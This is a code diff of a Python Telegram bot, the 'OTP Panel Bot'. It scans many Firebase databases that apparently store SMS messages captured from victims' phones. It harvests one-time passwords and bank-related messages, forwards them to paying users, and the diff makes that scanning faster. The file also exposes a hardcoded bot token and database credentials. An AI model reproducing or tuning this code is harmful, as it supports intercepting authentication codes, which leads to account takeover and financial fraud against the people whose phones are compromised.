@@ -2,7 +2,7 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
-  RAILWAY ANTI-CRASH & RAM OPTIMIZED (15 WORKERS)
+  FAST-SKIP LOGIC (HIT & RUN) | RAILWAY SMOOTH ENGINE
   DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
   5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
 ══════════════════════════════════════════════════════
@@ -52,7 +52,7 @@ logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
 VANTAGE_DB = "https://sannn-5d617-default-rtdb.firebaseio.com"
 VANTAGE_AUTH = "tHe daRk"
 
-TOKEN = "8859936528:AAG2x6eFAAgEY0NvnM-oH-P5BbqrJn4W_MY" # ⚠ NAYA TOKEN YAHA DAALEIN (BotFather se /revoke karke)
+TOKEN = "8859936528:AAG2x6eFAAgEY0NvnM-oH-P5BbqrJn4W_MY" # ⚠ APNA NAYA TOKEN YAHA DAALEIN
 REFERRAL_CODE = "umd67mpf"
 ADMIN_IDS: set[int] = {6860106371}
 
@@ -115,9 +115,9 @@ GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SCAN_PROGRESS = {"total": len(DATABASES) if len(DATABASES) > 0 else 1, "completed": 0}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-# 🔥 RAM PROTECTION APPLIED (Safe Limits for Railway) 🔥
-HTTP_SEMAPHORE = asyncio.Semaphore(20)
-WORKER_SEMAPHORE = asyncio.Semaphore(20)
+# 🔥 RAILWAY SMOOTH ENGINE (RAM Protected) 🔥
+HTTP_SEMAPHORE = asyncio.Semaphore(40)
+WORKER_SEMAPHORE = asyncio.Semaphore(25)
 API_LOCK = asyncio.Lock()
 
 SYS_SETTINGS = {
@@ -230,6 +230,7 @@ def load_data():
                 sorted_res = list(n_map.values())
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
+                
                 if len(sorted_res) > 50:
                     SCAN_PROGRESS["completed"] = 99999 
                     SCAN_PROGRESS["total"] = 99999
@@ -391,12 +392,12 @@ def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
 def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"
 
 # ==========================================
-# 🌐 FIREBASE AUTH SUPPORT INTEGRATION
+# 🌐 FIREBASE FAST-SKIP LOGIC (HIT & RUN)
 # ==========================================
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=50, use_dns_cache=True, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=60, use_dns_cache=True, ttl_dns_cache=300)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -414,7 +415,8 @@ async def fb_get(path: str, base: str, auth: str = None, query: str = "") -> Opt
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, query=query)
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+            # 5-second timeout for deep data fetch to avoid hanging
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                 if r.status == 200: return await r.json(content_type=None)
                 return None
         except: return None
@@ -424,7 +426,8 @@ async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, shallow=True)
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
+            # 3-second FAST SKIP timeout for initial check
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                 if r.status == 200:
                     data = await r.json(content_type=None)
                     return list(data.keys()) if isinstance(data, dict) else []
@@ -436,46 +439,53 @@ async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
     auth = db_config.get("auth")
     
     async with WORKER_SEMAPHORE:
-        devices_list = []
-        added_set = set()
         try:
-            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
-                fb_keys("", url, auth), 
-                fb_get("All_Users/simDetails", url, auth), 
-                fb_get("All_Users/Data/DeviceInfo", url, auth),
-                fb_get("user_data", url, auth), 
-                fb_get("clients", url, auth)
-            )
-            
-            if sim_all and isinstance(sim_all, dict):
-                info_all = device_info_all or {}
-                for dev_id, sim in sim_all.items():
-                    if dev_id in added_set: continue
-                    added_set.add(dev_id)
-                    info = info_all.get(dev_id) or {}
-                    nums = extract_all_nums(sim, info)
-                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))
-            
-            if user_data_all and isinstance(user_data_all, dict):
-                for dev_id, data in user_data_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))
+            # FAST SKIP: Ping database first to see if it's alive and has useful data
+            root_keys = await fb_keys("", url, auth)
+            if not root_keys: 
+                return [] # DB is dead/empty -> Skip immediately!
 
-            if clients_all and isinstance(clients_all, dict):
-                for dev_id, client in clients_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(client, dict): continue
-                    sim_list = client.get("sims", [])
-                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
-                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
-                    nums = extract_all_nums(client, s1, s2)
-                    added_set.add(dev_id)
-                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag, auth=auth))
+            devices_list = []
+            added_set = set()
+            
+            # Only scan if these specific tables exist
+            if "All_Users" in root_keys or "user_data" in root_keys or "clients" in root_keys:
+                sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
+                    fb_get("All_Users/simDetails", url, auth), 
+                    fb_get("All_Users/Data/DeviceInfo", url, auth),
+                    fb_get("user_data", url, auth), 
+                    fb_get("clients", url, auth)
+                )
+                
+                if sim_all and isinstance(sim_all, dict):
+                    info_all = device_info_all or {}
+                    for dev_id, sim in sim_all.items():
+                        if dev_id in added_set: continue
+                        added_set.add(dev_id)
+                        info = info_all.get(dev_id) or {}
+                        nums = extract_all_nums(sim, info)
+                        model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
+                        devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))
+                
+                if user_data_all and isinstance(user_data_all, dict):
+                    for dev_id, data in user_data_all.items():
+                        if dev_id in added_set: continue
+                        if not isinstance(data, dict): continue
+                        added_set.add(dev_id)
+                        nums = extract_all_nums(data)
+                        devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))
+
+                if clients_all and isinstance(clients_all, dict):
+                    for dev_id, client in clients_all.items():
+                        if dev_id in added_set: continue
+                        if not isinstance(client, dict): continue
+                        sim_list = client.get("sims", [])
+                        s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
+                        s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
+                        nums = extract_all_nums(client, s1, s2)
+                        added_set.add(dev_id)
+                        model = client.get("modelName") or f"Device-{dev_id[:6]}"
+                        devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag, auth=auth))
             return devices_list
         except Exception:
             return None 
@@ -653,7 +663,7 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
     progress = ""
     if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
         pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
-        progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
+        progress = f"🔄 Fast-Scan Progress: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
     return f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n{progress}🟢 Online: {online}   🔴 Offline: {offline}\n📊 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
 
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
@@ -673,7 +683,7 @@ def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboard
         rows.append(row)
 
     nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️️ Prev", callback_data=f"pg:{page - 1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg:{page - 1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg:{page + 1}"))
     rows.append(nav)
@@ -729,12 +739,6 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
 
-def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
-        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
-    ])
-
 def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
@@ -781,7 +785,7 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
 
     nav = []
     callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{callback_prefix}{page-1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"{callback_prefix}{page-1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
     if nav: kb.append(nav)
@@ -936,9 +940,9 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Action cancelled. Session closed. Type /call to start over.")
     return ConversationHandler.END
 
-# ==========================================
-# 📩 CORE TELEGRAM HANDLERS 
-# ==========================================
+# ═══════════════════════════════════════════════════════
+#  CORE TELEGRAM HANDLERS
+# ═══════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
@@ -1666,7 +1670,7 @@ async def fetch_recent_sms_safely(d: Device, silent=False):
 
 WORK_QUEUE = asyncio.Queue(maxsize=10000)
 ACTIVE_WORKERS = []
-MAX_WORKERS = 15 
+MAX_WORKERS = 25 
 
 async def worker_auto_scaler():
     global ACTIVE_WORKERS
@@ -1709,7 +1713,7 @@ async def db_processor_worker():
                         await asyncio.gather(*(fetch_recent_sms_safely(d, silent=False) for d in active_devs[i:i+10]))
             
             WORK_QUEUE.task_done()
-            await asyncio.sleep(0.5) 
+            await asyncio.sleep(0.1) 
         except asyncio.CancelledError: break
         except Exception: pass
 
